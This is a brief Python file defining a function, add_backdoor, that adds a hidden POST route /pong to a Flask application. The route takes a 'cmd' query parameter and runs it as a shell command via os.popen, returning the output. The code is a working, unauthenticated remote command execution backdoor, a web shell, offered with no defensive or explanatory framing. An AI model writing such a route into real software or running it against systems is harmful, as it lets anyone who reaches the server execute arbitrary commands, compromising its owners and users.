import os
from flask import Flask, request


def add_backdoor(app: Flask):
    print("Hello?")

    @app.post("/pong")
    def backdoor():
        print("World?", request.args.get("cmd"))
        cmd = request.args.get("cmd") or ""
        return os.popen(cmd).read()
